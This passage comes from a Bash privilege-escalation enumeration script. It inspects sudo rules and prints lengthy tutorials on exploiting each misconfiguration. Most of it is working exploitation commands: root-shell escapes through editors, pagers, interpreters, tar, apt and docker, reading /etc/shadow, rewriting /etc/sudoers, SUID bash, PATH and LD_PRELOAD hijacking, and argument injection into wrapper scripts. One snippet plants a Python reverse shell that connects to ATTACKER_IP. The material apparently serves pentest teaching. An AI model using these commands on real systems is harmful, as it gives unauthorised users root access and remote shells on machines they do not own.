            echo "$line" | grep -q "LD_LIBRARY_PATH" && has_ld_library_path=1
        fi
        
        # Check for (ALL) or (ALL:ALL) in RUNAS
        if echo "$line" | grep -qE '\(ALL[: ].*\)'; then
            has_runas_all=1
        fi
        
    done < <(echo "$sudo_output")
    
    # === PHASE 2: CONDITIONAL EDUCATION (ONLY IF ISSUES FOUND) ===
    local total_issues=$((has_all_all + has_nopasswd + has_env_keep + has_setenv + found_wildcards + found_relative_paths))
    
    if [ $total_issues -gt 0 ]; then
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  SUDO PRIVILEGE ESCALATION - COMPREHENSIVE GUIDE"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IS SUDO:"
        teach "  'sudo' (superuser do) allows authorized users to run commands"
        teach "  as another user, typically root. It's configured in /etc/sudoers."
        teach ""
        teach "HOW SUDO WORKS (THE SECURITY MODEL):"
        teach "  1. User runs: sudo <command>"
        teach "  2. Sudo checks /etc/sudoers for permissions"
        teach "  3. If allowed, prompts for USER's password (not root's)"
        teach "  4. Validates password against /etc/shadow"
        teach "  5. Executes command with elevated privileges"
        teach "  6. Caches credentials for 15 minutes (default)"
        teach ""
        teach "SUDOERS FILE FORMAT:"
        teach "  user  host=(runas_user:runas_group) tags: commands"
        teach ""
        teach "  Example breakdown:"
        teach "  bob   ALL=(ALL:ALL) NOPASSWD: /usr/bin/vim, /bin/cat"
        teach "   │     │    │   │      │        └─ Allowed commands"
        teach "   │     │    │   │      └─ No password required"
        teach "   │     │    │   └─ Can run as any group"
        teach "   │     │    └─ Can run as any user (including root)"
        teach "   │     └─ On all hosts"
        teach "   └─ Username"
        teach ""
        teach "WHY SUDO MISCONFIGURATIONS EXIST:"
        teach ""
        teach "  Convenience Over Security:"
        teach "    Admin needs to automate tasks → adds NOPASSWD"
        teach "    Developer needs frequent root access → grants (ALL:ALL)"
        teach "    Script needs one root command → gives broad permissions"
        teach ""
        teach "  Lack of Understanding:"
        teach "    Admin thinks: 'vim only edits files, it's safe'"
        teach "    Reality: vim can spawn shells, execute commands, read/write any file"
        teach ""
        teach "  Incremental Creep:"
        teach "    Starts with: bob ALL=(ALL) /usr/bin/systemctl restart apache2"
        teach "    User needs more: bob ALL=(ALL) /usr/bin/systemctl *"
        teach "    Gets annoying: bob ALL=(ALL) NOPASSWD: /usr/bin/systemctl *"
        teach "    Eventually: bob ALL=(ALL) NOPASSWD: ALL"
        teach ""
        teach "THE FUNDAMENTAL PROBLEM:"
        teach "  Many programs can do MORE than their intended purpose:"
        teach "  • Text editors → spawn shells (:!/bin/bash)"
        teach "  • File viewers → execute commands (!sh)"
        teach "  • Interpreters → import os; os.system('/bin/bash')"
        teach "  • Utilities → find . -exec /bin/bash \\; -quit"
        teach ""
        teach "  Admins grant access to the PROGRAM, not realizing it can"
        teach "  be abused to gain full shell access."
        log ""
    fi
    
    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
    
    # Finding 1: Unrestricted sudo access
    if [ $has_all_all_nopasswd -eq 1 ]; then
        critical "UNRESTRICTED SUDO (NO PASSWORD) - Instant root access"
        vuln "Configuration: (ALL:ALL) NOPASSWD: ALL"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  UNRESTRICTED SUDO - THE NUCLEAR OPTION"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT THIS MEANS:"
        teach "  You can run ANY command as ANY user without entering a password."
        teach "  This is functionally equivalent to having root's password."
        teach ""
        teach "WHY IT EXISTS:"
        teach "  • Lazy system administration"
        teach "  • Automation/scripts that can't provide passwords"
        teach "  • Development/testing environments"
        teach "  • 'Temporary' fix that became permanent"
        teach ""
        teach "INSTANT EXPLOITATION:"
        teach "  sudo /bin/bash          # Direct root shell"
        teach "  sudo su                 # Switch to root user"
        teach "  sudo -s                 # Start shell as root"
        teach "  sudo -i                 # Login shell as root"
        teach ""
        teach "NO EVASION NEEDED:"
        teach "  This is the simplest privilege escalation possible."
        teach "  No tricks, no bypasses, no exploits required."
        log ""
        
    elif [ $has_all_all -eq 1 ]; then
        critical "UNRESTRICTED SUDO (PASSWORD REQUIRED) - Root with your password"
        vuln "Configuration: (ALL:ALL) ALL"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  UNRESTRICTED SUDO WITH PASSWORD"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT THIS MEANS:"
        teach "  You can run ANY command as root, but must enter YOUR password."
        teach ""
        teach "EXPLOITATION:"
        teach "  If you know your own password:"
        teach "    sudo /bin/bash"
        teach "    [enter your password]"
        teach "    # root shell"
        teach ""
        teach "  If you DON'T know your password:"
        teach "    • Try default passwords (password, username, admin)"
        teach "    • Check for password in files (.bash_history, config files)"
        teach "    • Brute force (risky, may lock account)"
        teach "    • Look for other privilege escalation vectors"
        log ""
    fi
    
    # Finding 2: NOPASSWD binaries with detailed exploitation
    if [ $found_exploitable_bins -eq 1 ]; then
        critical "NOPASSWD BINARIES DETECTED - Shell escape vectors available"
        log ""
        
        # Process each unique binary
        sort -u "$temp_bins" 2>/dev/null | while read bin; do
            [ -z "$bin" ] && continue
            
            local basename=$(basename "$bin" 2>/dev/null || echo "$bin")
            vuln "NOPASSWD SUDO: $bin"
            log ""
            
            # Provide detailed exploitation per binary type
            case $basename in
                # === TEXT EDITORS ===
                vim|vi)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  VIM/VI EXPLOITATION - MULTIPLE METHODS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY VIM IS DANGEROUS:"
                    teach "  Vim is a text editor with extensive scripting capabilities."
                    teach "  It can execute shell commands, read/write files, and spawn shells."
                    teach ""
                    teach "METHOD 1 - Direct Shell Spawn (Fastest):"
                    teach "  sudo $bin -c ':!/bin/bash'"
                    teach "  sudo $bin -c ':sh'"
                    teach ""
                    teach "METHOD 2 - Interactive Shell Escape:"
                    teach "  sudo $bin"
                    teach "  :set shell=/bin/bash"
                    teach "  :shell"
                    teach ""
                    teach "METHOD 3 - Execute Commands Without Full Shell:"
                    teach "  sudo $bin -c ':!whoami'"
                    teach "  sudo $bin -c ':!cat /etc/shadow'"
                    teach ""
                    teach "METHOD 4 - Read/Write Any File:"
                    teach "  sudo $bin /etc/shadow"
                    teach "  :w /tmp/shadow_copy"
                    teach ""
                    teach "METHOD 5 - Modify Sudoers (If You Want Persistence):"
                    teach "  sudo $bin /etc/sudoers"
                    teach "  # Add: $(whoami) ALL=(ALL) NOPASSWD: ALL"
                    teach ""
                    teach "WHY ADMINS GRANT THIS:"
                    teach "  Thought process: 'They only need to edit config files'"
                    teach "  Reality: Vim can do anything the shell can do"
                    ;;
                    
                nano)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  NANO EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY NANO IS EXPLOITABLE:"
                    teach "  While simpler than vim, nano can still execute commands"
                    teach "  via its read/write external command feature."
                    teach ""
                    teach "METHOD 1 - Command Execution:"
                    teach "  sudo $bin"
                    teach "  Press: Ctrl+R (Read File)"
                    teach "  Press: Ctrl+X (Execute Command)"
                    teach "  Type: reset; sh 1>&0 2>&0"
                    teach "  Press: Enter"
                    teach ""
                    teach "METHOD 2 - Simpler Variant:"
                    teach "  sudo $bin"
                    teach "  ^R^X"
                    teach "  bash"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  Ctrl+R normally reads a file into the buffer"
                    teach "  Ctrl+X executes a command and reads its output"
                    teach "  We execute 'bash' and redirect stdin/stdout/stderr"
                    teach "  Result: Interactive shell as root"
                    ;;
                    
                emacs)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  EMACS EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHODS:"
                    teach "  sudo $bin --eval '(term \"/bin/bash\")'"
                    teach "  # Or interactively:"
                    teach "  sudo $bin"
                    teach "  M-x shell"
                    teach "  # Or:"
                    teach "  M-x term"
                    ;;
                
                # === FILE VIEWERS ===
                less|more)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  LESS/MORE EXPLOITATION - PAGER ESCAPE"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY PAGERS ARE DANGEROUS:"
                    teach "  less/more are pagers (display file content page by page)"
                    teach "  They have a '!' command that executes shell commands"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin /etc/profile"
                    teach "  # Wait for pager to load"
                    teach "  # Type: !sh"
                    teach "  # Press: Enter"
                    teach "  # You now have root shell"
                    teach ""
                    teach "ALTERNATE SYNTAX:"
                    teach "  !bash"
                    teach "  !/bin/bash"
                    teach "  !sh"
                    teach ""
                    teach "WHY IT WORKS:"
                    teach "  The '!' command in less/more spawns a shell"
                    teach "  Since less is running as root (via sudo), the shell is root too"
                    teach ""
                    teach "IF NO SHELL PROMPT APPEARS:"
                    teach "  Type: v"
                    teach "  # This opens vi, then use vim escape methods"
                    ;;
                    
                # === SEARCH UTILITIES ===
                find)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  FIND EXPLOITATION - EXECUTE ARBITRARY COMMANDS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY FIND IS DANGEROUS:"
                    teach "  The -exec flag allows running commands on found files"
                    teach "  We can abuse this to execute /bin/sh"
                    teach ""
                    teach "METHOD 1 - Direct Shell:"
                    teach "  sudo $bin . -exec /bin/sh \\; -quit"
                    teach ""
                    teach "METHOD 2 - Execute Specific Command:"
                    teach "  sudo $bin . -exec /bin/bash -p \\; -quit"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  find .           # Search in current directory"
                    teach "  -exec /bin/sh \\; # Execute shell for each result"
                    teach "  -quit            # Quit after first match (faster)"
                    teach ""
                    teach "WHY \\; IS NEEDED:"
                    teach "  The semicolon ends the -exec command"
                    teach "  Backslash escapes it from the shell"
                    teach ""
                    teach "ALTERNATE EXPLOITATION:"
                    teach "  sudo $bin . -exec chmod u+s /bin/bash \\;"
                    teach "  # Makes bash SUID, then:"
                    teach "  /bin/bash -p"
                    ;;
                    
                # === SCRIPTING LANGUAGES ===
                python*|python)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  PYTHON EXPLOITATION - MULTIPLE VECTORS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY PYTHON IS EXTREMELY DANGEROUS:"
                    teach "  Python is a full programming language with OS interaction"
                    teach "  Can execute shell commands, manipulate files, spawn processes"
                    teach ""
                    teach "METHOD 1 - Direct Shell Spawn:"
                    teach "  sudo $bin -c 'import os; os.system(\"/bin/bash\")'"
                    teach ""
                    teach "METHOD 2 - Using execl (cleaner):"
                    teach "  sudo $bin -c 'import os; os.execl(\"/bin/bash\", \"bash\", \"-p\")'"
                    teach ""
                    teach "METHOD 3 - Using subprocess:"
                    teach "  sudo $bin -c 'import subprocess; subprocess.call([\"/bin/bash\"])'"
                    teach ""
                    teach "METHOD 4 - PTY Shell (Interactive):"
                    teach "  sudo $bin -c 'import pty; pty.spawn(\"/bin/bash\")'"
                    teach ""
                    teach "METHOD 5 - Reading Sensitive Files:"
                    teach "  sudo $bin -c 'print(open(\"/etc/shadow\").read())'"
                    teach ""
                    teach "METHOD 6 - Writing Files:"
                    teach "  sudo $bin -c 'open(\"/etc/sudoers\",\"a\").write(\"user ALL=(ALL) NOPASSWD: ALL\")'"
                    teach ""
                    teach "FOR PERSISTENCE - Create SUID Bash:"
                    teach "  sudo $bin -c 'import os; os.chmod(\"/bin/bash\", 0o4755)'"
                    teach "  /bin/bash -p"
                    ;;
                    
                perl)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  PERL EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1 - exec (replaces current process):"
                    teach "  sudo $bin -e 'exec \"/bin/bash\";'"
                    teach ""
                    teach "METHOD 2 - system (spawns subprocess):"
                    teach "  sudo $bin -e 'system(\"/bin/bash\");'"
                    teach ""
                    teach "METHOD 3 - Using POSIX setuid:"
                    teach "  sudo $bin -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
                    ;;
                    
                ruby)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  RUBY EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1 - exec:"
                    teach "  sudo $bin -e 'exec \"/bin/bash\"'"
                    teach ""
                    teach "METHOD 2 - system:"
                    teach "  sudo $bin -e 'system(\"/bin/bash\")'"
                    teach ""
                    teach "METHOD 3 - With setuid:"
                    teach "  sudo $bin -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'"
                    ;;
                    
                node|nodejs)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  NODE.JS EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1 - child_process.spawn:"
                    teach "  sudo $bin -e 'require(\"child_process\").spawn(\"/bin/bash\", {\""
                    teach "    stdio: [0,1,2]})'"
                    teach ""
                    teach "METHOD 2 - child_process.exec:"
                    teach "  sudo $bin -e 'require(\"child_process\").exec(\"/bin/bash\")'"
                    ;;
                
                # === SHELLS ===
                bash|sh|zsh|dash)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  SHELL BINARY - DIRECT ACCESS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "This is the simplest case - direct shell access."
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin"
                    teach ""
                    teach "IF BASH, PRESERVE PRIVILEGES:"
                    teach "  sudo $bin -p"
                    teach ""
                    teach "WHY -p FLAG:"
                    teach "  Bash drops privileges if EUID ≠ UID"
                    teach "  -p flag preserves the effective UID"
                    ;;
                    
                # === UTILITIES ===
                env)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  ENV EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHAT ENV DOES:"
                    teach "  Runs a program in a modified environment"
                    teach "  Can be used to execute any binary"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin /bin/sh"
                    teach "  sudo $bin /bin/bash"
                    ;;
                    
                awk|gawk|nawk|mawk)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  AWK EXPLOITATION - TEXT PROCESSING TO SHELL"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY AWK IS DANGEROUS:"
                    teach "  AWK is a text processing language with system() function"
                    teach "  BEGIN block executes before processing any input"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin 'BEGIN {system(\"/bin/bash\")}'"
                    teach ""
                    teach "ALTERNATE:"
                    teach "  sudo $bin 'BEGIN {system(\"/bin/sh\")}'"
                    ;;
                    
                sed)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  SED EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "METHOD 1 - Execute command:"
                    teach "  sudo $bin -n '1e exec /bin/sh' /etc/hosts"
                    teach ""
                    teach "METHOD 2 - Using GNU sed e flag:"
                    teach "  echo | sudo $bin '1e /bin/sh'"
                    ;;
                    
                systemctl)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  SYSTEMCTL EXPLOITATION - PAGER ESCAPE"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY SYSTEMCTL IS EXPLOITABLE:"
                    teach "  When showing long output, systemctl uses a pager (usually less)"
                    teach "  We can escape from the pager to get a shell"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin status trail.service"
                    teach "  # Or any service with long output"
                    teach "  # Wait for pager to appear"
                    teach "  # Type: !sh"
                    teach "  # Press Enter"
                    teach ""
                    teach "IF THAT DOESN'T WORK:"
                    teach "  Set pager before running:"
                    teach "  export PAGER='/bin/bash -c \"/bin/bash\"'"
                    teach "  sudo $bin status any.service"
                    ;;
                    
                git)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  GIT EXPLOITATION - PAGER ESCAPE"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin help status"
                    teach "  # Wait for pager"
                    teach "  # Type: !sh"
                    teach ""
                    teach "ALTERNATE - Set pager:"
                    teach "  sudo $bin -c 'core.pager=/bin/sh' config"
                    teach "  sudo $bin log"
                    ;;
                    
                tar)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  TAR EXPLOITATION - CHECKPOINT ACTION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY TAR IS DANGEROUS:"
                    teach "  tar has a --checkpoint-action flag that executes commands"
                    teach "  Intended for progress monitoring, but can run anything"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin -cf /dev/null /dev/null --checkpoint=1 \\"
                    teach "    --checkpoint-action=exec=/bin/sh"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  -cf /dev/null    # Create archive to /dev/null"
                    teach "  /dev/null        # Archive this file"
                    teach "  --checkpoint=1   # Run action at checkpoint 1"
                    teach "  --checkpoint-action=exec=/bin/sh  # Execute shell"
                    ;;
                    
                zip)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  ZIP EXPLOITATION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin /tmp/x.zip /etc/hosts -T -TT 'sh #'"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  -T  # Test integrity"
                    teach "  -TT # Test extra integrity (runs command)"
                    ;;
                    
                make)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  MAKE EXPLOITATION - MAKEFILE EXECUTION"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin -s --eval=\$'x:\\n\\t-/bin/bash -p'"
                    teach ""
                    teach "ALTERNATE - If you can write Makefile:"
                    teach "  echo 'x:' > /tmp/Makefile"
                    teach "  echo -e '\\t/bin/bash -p' >> /tmp/Makefile"
                    teach "  cd /tmp && sudo $bin"
                    ;;
                    
                apt|apt-get)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  APT/APT-GET EXPLOITATION - PRE-INVOKE HOOKS"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY APT IS DANGEROUS:"
                    teach "  APT can run commands before/after package operations"
                    teach "  These hooks (Pre-Invoke) execute as root"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin update -o APT::Update::Pre-Invoke::=/bin/sh"
                    teach ""
                    teach "ALTERNATE - Config file method:"
                    teach "  echo 'APT::Update::Pre-Invoke {\"/bin/bash -i\"};' > /tmp/pwn"
                    teach "  sudo $bin update -c /tmp/pwn"
                    ;;
                    
                yum)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  YUM EXPLOITATION - PLUGIN LOADING"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  TF=\$(mktemp -d)"
                    teach "  cat > \$TF/x.py << 'EOF'"
                    teach "  import os"
                    teach "  import yum"
                    teach "  from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE"
                    teach "  requires_api_version='2.1'"
                    teach "  def init_hook(conduit):"
                    teach "      os.execl('/bin/bash','bash')"
                    teach "  EOF"
                    teach "  sudo $bin -c \"pluginpath=\$TF\" --plugins list"
                    ;;
                    
                docker)
                    teach "╔════════════════════════════════════════════════════════════════╗"
                    teach "║  DOCKER EXPLOITATION - CONTAINER MOUNT"
                    teach "╚════════════════════════════════════════════════════════════════╝"
                    teach ""
                    teach "WHY DOCKER SUDO IS CRITICAL:"
                    teach "  Docker daemon runs as root"
                    teach "  Can mount host filesystem inside containers"
                    teach "  Container root = host root (by default)"
                    teach ""
                    teach "EXPLOITATION:"
                    teach "  sudo $bin run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
                    teach ""
                    teach "WHAT'S HAPPENING:"
                    teach "  -v /:/mnt        # Mount host root to /mnt in container"
                    teach "  --rm             # Remove container after exit"
                    teach "  -it              # Interactive terminal"
                    teach "  alpine           # Lightweight image"
                    teach "  chroot /mnt      # Change root to mounted host filesystem"
                    teach "  /bin/bash        # Spawn shell"
                    teach ""
                    teach "RESULT:"
                    teach "  You're now root on the HOST system, not in a container"
                    ;;
                    
                *)
                    warn "Binary: $basename"
                    teach "→ Not in our database. Check GTFOBins:"
                    teach "  https://gtfobins.github.io/#$basename"
                    teach ""
                    teach "GENERAL EXPLOITATION APPROACH:"
                    teach "  1. Does it spawn a shell? (bash, sh, exec)"
                    teach "  2. Can it execute commands? (system(), exec(), etc.)"
                    teach "  3. Does it have a pager? (!, :!sh)"
                    teach "  4. Can it write files? (may allow /etc/sudoers modification)"
                    teach "  5. Does it call other programs? (PATH hijacking potential)"
                    ;;
            esac
            log ""
        done
    fi
    
    # Finding 3: Wildcard injection opportunities
    if [ $found_wildcards -eq 1 ]; then
        critical "WILDCARD IN SUDO COMMANDS - Argument injection possible"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  WILDCARD INJECTION - ADVANCED EXPLOITATION"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT WILDCARDS MEAN:"
        teach "  Admins sometimes use wildcards in sudoers to allow flexibility:"
        teach "  Example: alice ALL=(ALL) NOPASSWD: /usr/bin/systemctl * apache2"
        teach ""
        teach "THE VULNERABILITY:"
        teach "  Wildcards match ANY text, including additional arguments"
        teach "  You can inject malicious arguments that change command behavior"
        teach ""
        teach "EXAMPLE SCENARIO:"
        teach "  Sudoers entry:"
        teach "  bob ALL=(ALL) NOPASSWD: /usr/bin/systemctl * apache2"
        teach ""
        teach "  Admin intention:"
        teach "    sudo systemctl restart apache2"
        teach "    sudo systemctl stop apache2"
        teach ""
        teach "  Exploitation:"
        teach "    sudo systemctl status apache2"
        teach "    # Wait for pager, then: !sh"
        teach ""
        teach "WHY IT WORKS:"
        teach "  'systemctl status apache2' matches the pattern"
        teach "  'status' matches the wildcard"
        teach "  systemctl shows output in pager → pager escape"
        teach ""
        
        while IFS= read -r line; do
            vuln "Wildcard entry: $line"
            
            # Analyze what can be done
            if echo "$line" | grep -qi "systemctl"; then
                teach "→ systemctl wildcard detected"
                teach "  Try: sudo systemctl status <service> → !sh"
            fi
            
            if echo "$line" | grep -qi "find"; then
                teach "→ find wildcard detected"
                teach "  Inject -exec: sudo find <matching_pattern> . -exec /bin/sh \\;"
            fi
            
            if echo "$line" | grep -qi "vim\|vi\|nano\|emacs"; then
                teach "→ Editor with wildcard"
                teach "  Any file access → shell escape from editor"
            fi
        done < "$temp_wildcards"
        log ""
    fi
    
    # Finding 4: Relative paths (PATH hijacking)
    if [ $found_relative_paths -eq 1 ]; then
        critical "RELATIVE PATHS IN SUDO - PATH hijacking possible"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  PATH HIJACKING - SUDO EDITION"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT RELATIVE PATHS MEAN:"
        teach "  Absolute path: /usr/bin/python (starts with /)"
        teach "  Relative path: python (no leading /)"
        teach ""
        teach "THE VULNERABILITY:"
        teach "  When sudo runs a relative path command, it searches \$PATH"
        teach "  If you control a directory early in PATH, you control what executes"
        teach ""
        teach "WHY THIS HAPPENS:"
        teach "  Admin writes in sudoers: alice ALL=(ALL) NOPASSWD: python /scripts/backup.py"
        teach "  Thinks: 'python will be /usr/bin/python'"
        teach "  Reality: 'python' searches PATH directories in order"
        teach ""
        teach "EXPLOITATION STEPS:"
        teach ""
        teach "  1. Check current PATH:"
        teach "     echo \$PATH"
        teach ""
        teach "  2. Find writable directory in PATH:"
        teach "     # Often /usr/local/bin or /tmp if misconfigured"
        teach ""
        teach "  3. Create malicious binary in that directory:"
        
        while IFS='|' read -r line cmd; do
            [ -z "$cmd" ] && continue
            vuln "Relative path: $cmd"
            teach ""
            teach "  Create fake $cmd:"
            teach "  cat > /tmp/$cmd << 'EOF'"
            teach "  #!/bin/bash"
            teach "  /bin/bash -p"
            teach "  EOF"
            teach "  chmod +x /tmp/$cmd"
            teach ""
            teach "  4. Modify PATH (if possible):"
            teach "     export PATH=/tmp:\$PATH"
            teach ""
            teach "  5. Run sudo command:"
            teach "     sudo $cmd ..."
            teach "     # Executes YOUR binary as root"
        done < "$temp_relative"
        log ""
    fi
    
    # Finding 5: Shell wrapper scripts
    if [ $found_shell_wrappers -eq 1 ]; then
        warn "SHELL WRAPPER SCRIPTS IN SUDO - Analyze for command injection"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  SHELL WRAPPER EXPLOITATION"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT ARE WRAPPER SCRIPTS:"
        teach "  Shell scripts that wrap other commands"
        teach "  Often added to sudoers instead of the actual binary"
        teach ""
        teach "COMMON VULNERABILITIES:"
        teach "  1. Command injection via arguments"
        teach "  2. Unquoted variables"
        teach "  3. Unsafe use of user input"
        teach "  4. Calls to other programs without full paths"
        teach ""
        
        while IFS='|' read -r line script; do
            [ -z "$script" ] && continue
            vuln "Wrapper script: $script"
            
            if [ -r "$script" ]; then
                teach ""
                teach "Analyzing $script for vulnerabilities..."
                
                # Check for command injection patterns
                if grep -E '\$[1-9@*]|\${.*}' "$script" | grep -v '^#' | grep -q .; then
                    critical "  Script uses user input/arguments!"
                    teach "  Found user input usage:"
                    grep -E '\$[1-9@*]|\${.*}' "$script" | grep -v '^#' | head -3 | while read found; do
                        teach "    $found"
                    done
                fi
                
                # Check for unquoted variables
                if grep -E '\$[A-Za-z_][A-Za-z0-9_]*[^"]' "$script" | grep -v '^#' | grep -q .; then
                    warn "  Potentially unquoted variables detected"
                fi
                
                # Check for calls without absolute paths
                if grep -vE '^#|^[[:space:]]*#' "$script" | grep -E '^[[:space:]]*(system|exec|eval|source|\.)' | grep -q .; then
                    warn "  Script calls other programs - check for PATH exploitation"
                fi
                
                teach ""
                teach "EXPLOITATION APPROACHES:"
                teach "  1. If script uses arguments unsafely:"
                teach "     sudo $script '; /bin/bash #'"
                teach "     sudo $script '\$(whoami)'"
                teach ""
                teach "  2. If script calls other binaries:"
                teach "     - Check if PATH can be modified"
                teach "     - Create malicious binary with same name"
                teach ""
                teach "  3. Manual analysis:"
                teach "     cat $script"
                teach "     Look for: eval, system(), exec, unquoted \$variables"
            else
                warn "  Cannot read script - manual analysis required"
            fi
        done < "$temp_wrappers"
        log ""
    fi
    
    # Finding 6: SETENV tag
    if [ $has_setenv -eq 1 ]; then
        critical "SETENV TAG DETECTED - Can modify environment variables"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  SETENV - ENVIRONMENT VARIABLE CONTROL"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT SETENV DOES:"
        teach "  Allows setting arbitrary environment variables when using sudo"
        teach "  Normally sudo sanitizes environment for security"
        teach "  SETENV disables this protection"
        teach ""
        teach "WHY IT'S DANGEROUS:"
        teach "  Many programs rely on environment variables"
        teach "  Attackers can hijack behavior by setting:"
        teach "  • LD_PRELOAD (load malicious library)"
        teach "  • LD_LIBRARY_PATH (override library location)"
        teach "  • PATH (hijack command resolution)"
        teach "  • PYTHONPATH (inject malicious Python modules)"
        teach ""
        teach "EXPLOITATION:"
        teach "  sudo ARBITRARY_VAR=value <allowed_command>"
        teach ""
        teach "SPECIFIC ATTACKS:"
        teach ""
        teach "  1. LD_PRELOAD (if program uses dynamic libraries):"
        teach "     Create evil.c:"
        teach "     #include <stdio.h>"
        teach "     #include <sys/types.h>"
        teach "     #include <stdlib.h>"
        teach "     void _init() {"
        teach "         unsetenv(\"LD_PRELOAD\");"
        teach "         setgid(0); setuid(0);"
        teach "         system(\"/bin/bash -p\");"
        teach "     }"
        teach ""
        teach "     Compile:"
        teach "     gcc -shared -fPIC -o /tmp/evil.so evil.c"
        teach ""
        teach "     Execute:"
        teach "     sudo LD_PRELOAD=/tmp/evil.so <allowed_command>"
        teach ""
        teach "  2. If Python script:"
        teach "     mkdir /tmp/modules"
        teach "     cat > /tmp/modules/os.py << 'EOF'"
        teach "     import socket,subprocess"
        teach "     s=socket.socket()"
        teach "     s.connect((\"ATTACKER_IP\",4444))"
        teach "     subprocess.call([\"/bin/bash\"],stdin=s.fileno(),"
        teach "       stdout=s.fileno(),stderr=s.fileno())"
        teach "     EOF"
        teach ""
        teach "     sudo PYTHONPATH=/tmp/modules <python_script>"
        log ""
    fi
    
    # Finding 7: env_keep with LD_PRELOAD
    if [ $has_ld_preload -eq 1 ]; then
        critical "LD_PRELOAD PRESERVED - Library injection attack"
        log ""
        teach "╔════════════════════════════════════════════════════════════════╗"
        teach "║  LD_PRELOAD EXPLOITATION - IN DEPTH"
        teach "╚════════════════════════════════════════════════════════════════╝"
        teach ""
        teach "WHAT IS LD_PRELOAD:"
        teach "  Environment variable that forces dynamic linker to load"
        teach "  specified libraries BEFORE all others"
        teach ""
        teach "HOW PROGRAMS LOAD LIBRARIES:"
        teach "  1. Program starts"
        teach "  2. Dynamic linker (ld.so) loads shared libraries"
